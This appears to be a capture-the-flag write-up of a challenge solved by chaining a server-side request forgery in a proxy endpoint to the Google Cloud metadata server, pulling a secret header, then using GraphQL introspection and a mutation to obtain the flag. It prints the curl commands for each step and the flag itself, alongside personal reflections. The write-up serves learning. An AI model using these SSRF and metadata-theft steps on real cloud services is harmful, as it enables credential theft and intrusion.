# juche-jaguar-ssrf-graphql-ctf
D.o.D Cybersecurity Sentinel Challenge 2025 (Hard Level CTF)


# Juche Jaguar SSRF + GraphQL Exploit Write-Up

## Overview
This challenge involved exploiting a Server-Side Request Forgery (SSRF) vulnerability to access an internal metadata service, retrieve a secret header, and use it to interact with a protected GraphQL endpoint.

The final objective was to discover and execute a randomized mutation to extract the flag.

---

## 🧠 Key Concepts
- SSRF (Server-Side Request Forgery)
- Google Cloud Metadata Service
- Header-based authentication
- GraphQL schema introspection
- Dynamic mutation discovery

---

## 🔍 Initial Recon

The application exposed a proxy endpoint:

/proxy?url=

This indicated a potential SSRF vulnerability.

---

## 🚧 Roadblock: Invalid URL / 400 Errors

Initial attempts to directly access:
metadata.google.internal
resulted in:
- 400 Bad Request
- Invalid URL

This indicated:
- Input validation or filtering on the proxy
- Need for a different approach

---

## 💡 Breakthrough: Metadata Server Location

Using a hint, I identified the internal metadata server IP:

169.254.169.254

This is standard for Google Compute Engine.

---

## 🕵️ Enumeration via SSRF

Instead of guessing the secret path, I enumerated available metadata attributes:

bash curl "http://TARGET/proxy?url=http://169.254.169.254/computeMetadata/v1/instance/attributes/" \   -H "Metadata-Flavor: Google" 

This revealed the correct attribute name.

---

## 🔐 Extracting the Secret Header

bash curl "http://TARGET/proxy?url=http://169.254.169.254/computeMetadata/v1/instance/attributes/<attribute>" \   -H "Metadata-Flavor: Google" 

This returned the required one-time secret header.

---

## 🧬 GraphQL Introspection

Using the secret header:

bash curl -X POST "http://TARGET/graphql" \   -H "Content-Type: application/json" \   -H "x-secret-header: <SECRET>" \   -d '{"query":"query { __schema { mutationType { fields { name } } } }"}' 

This exposed the available mutation names.

---

## 🚩 Flag Extraction

After identifying the randomized mutation:

bash curl -X POST "http://TARGET/graphql" \   -H "Content-Type: application/json" \   -H "x-secret-header: <SECRET>" \   -d '{"query":"mutation { <MUTATION_NAME> }"}' 

---

## 🏁 Flag

C1{r0b0ts_arent_4lways_p0lit3}

---

## 🧠 Lessons Learned

- SSRF often requires enumeration, not guessing
- Metadata services are high-value SSRF targets
- GraphQL introspection can reveal hidden attack paths
- When stuck, revisit assumptions instead of brute forcing blindly

---

## 🔁 Personal Reflection

One of the biggest takeaways from this challenge was recognizing how often I second-guessed correct instincts.

There were multiple points where I:
- Revisited paths I had already explored
- Questioned findings that were actually correct
- Eventually circled back to the right approach

The turning point was trusting my intuition and verifying it instead of abandoning it.

---

## 🛠 Tools Used
- curl
- Kali Linux
- Browser DevTools
- CyberChef (for analysis, not exploitation)

---

## 📌 Notes
- Challenge completed during DoD Cyber Sentinel-style competition
- Focused on real-world cloud attack surface techniques

---


## 🧠 Thought Process

One of the biggest challenges in this exercise wasn’t the technical steps—it was trusting my own reasoning.

There were multiple points where I:
- Revisited paths I had already explored
- Questioned correct assumptions
- Looked for more complex answers when the solution was already in front of me

I had actually accessed the correct location earlier but second-guessed it and moved away from it.

The breakthrough came when I trusted my initial instincts and verified them instead of abandoning them.

This reinforced an important lesson:
**Accuracy matters more than overcomplication.**